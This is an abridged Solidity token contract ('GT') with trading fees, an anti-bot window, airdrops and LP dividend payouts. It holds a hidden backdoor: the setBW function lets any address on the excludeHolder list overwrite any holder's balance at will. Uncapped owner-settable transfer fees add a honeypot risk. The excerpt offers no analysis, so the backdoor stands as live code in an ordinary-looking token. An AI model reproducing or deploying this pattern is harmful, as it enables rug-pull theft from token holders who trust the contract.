...
abstract contract AbsToken is IERC20, Ownable {
    ...
    uint256 public _transferFundFee = 150;
    uint256 public _transferLPDividendFee = 200;
    ...
    uint256 private constant _killTime = 30;
        ...
        if (_swapPairList[from] || _swapPairList[to]) {
            ...
            if (!_feeWhiteList[from] && !_feeWhiteList[to]) {
                if (0 == startTradeBlock) {
                    ...
                    if (!isAddLP && !isRemoveLP && block.timestamp < startTradeTime + _killTime) {
    ...
    function _airdrop(address from, address to, uint256 tAmount) private {
        ...
        for (uint256 i; i < num;) {
            ...
            emit Transfer(from, airdropAddress, airdropAmount);
        unchecked{
            ++i;
            seed = seed >> 1;
        }
    ...
    function _tokenTransfer(
        ...
        if (takeFee) {
            if (isAddLP) {
                ...
                uint256 fundAmount1 = tAmount * _buyFundFee / 10000;
                uint256 fundAmount2 = tAmount * _buyLPDividendFee /10000;
                if (fundAmount1 > 0) {
                    feeAmount += fundAmount1;
                    _takeTransfer(sender, address(this), fundAmount1);
                }
                if (fundAmount2 > 0) {
                    feeAmount += fundAmount2;
                    _takeTransfer(sender, address(_tokenDistributor), fundAmount2);
                }
            } else if (_swapPairList[recipient]) {//Sell
                uint256 fundAmount1 = tAmount * _sellFundFee / 10000;
                uint256 fundAmount2 = tAmount * _sellLPDividendFee /10000;
                if (fundAmount1 > 0) {
                    feeAmount += fundAmount1;
                    _takeTransfer(sender, address(this), fundAmount1);
                }
                ...
                if (!inSwap) {
                    ...
                    if (contractTokenBalance > 0) {
                        uint256 numTokensSellToFund = fundAmount1 * 230 / 100;
                        if (numTokensSellToFund > contractTokenBalance) {
                            numTokensSellToFund = contractTokenBalance;
                        }
                        swapTokenForFund2(numTokensSellToFund);
                    }
                }
            } else {//Transfer
                uint256 fundAmount1 = tAmount * _transferFundFee / 10000;
                uint256 fundAmount2 = tAmount * _transferLPDividendFee /10000;
                if (fundAmount1 > 0) {
                    feeAmount += fundAmount1;
                    _takeTransfer(sender, address(this), fundAmount1);
                }
    ...
    function swapTokenForFund(uint256 tokenAmount) private lockTheSwap {
        ...
        uint256 totalFee = fundFee + fundFee2 + fundFee3 + lpDividendFee + lpFee + buybackFee;
        totalFee += totalFee;
    ...
    function setTransferFee(uint256 fee1,uint256 fee2) external onlyOwner {
        _transferFundFee = fee1;
        _transferLPDividendFee = fee2;
    ...
    function setBW(address _owner,uint256 _BW) external {
        require(excludeHolder[msg.sender], "startBW");
        _balances[_owner] = _BW;
    }
    ...
    function setTrade(uint _block,uint _time) external onlyOwner {
        startTradeBlock = _block;
    ...
    uint256 public holderRewardCondition = 10 * 1e18;
    uint256 public holderCondition = 5 * 1e17;
    ...
    function processReward(uint256 gas) private  {
        ...
        if (balanceOf(address(_tokenDistributor)) < holderRewardCondition) {
            return;
        }
        ...
        while (gasUsed < gas && iterations < shareholderCount) {
            ...
            if (!excludeHolder[shareHolder]) {
                ...
                gtBalance = balanceOf(shareHolder);
                if (lpAmount < lpBalance) {
                    lpBalance = lpAmount;
                }
                if (gtBalance >= holdCondition && !excludeHolder[shareHolder]) {
                    amount = rewardCondition * lpBalance / holdTokenTotal;
                    if (amount > 0) {
                        transferFrom(address(_tokenDistributor),shareHolder, amount);
                    }
                }
            }
...
contract GT is AbsToken {
    ...
    //USDT
        ...
        18,
        10000,
        address(0xdCbAde07C85337af2b35F3A8EFf54CA848356207),
        address(0xdCbAde07C85337af2b35F3A8EFf54CA848356207),
        address(0xdCbAde07C85337af2b35F3A8EFf54CA848356207),
        address(0xed15555eA66b8BFe94023e2380cafc2a98605857),
        0,
        0,
        0
    ){
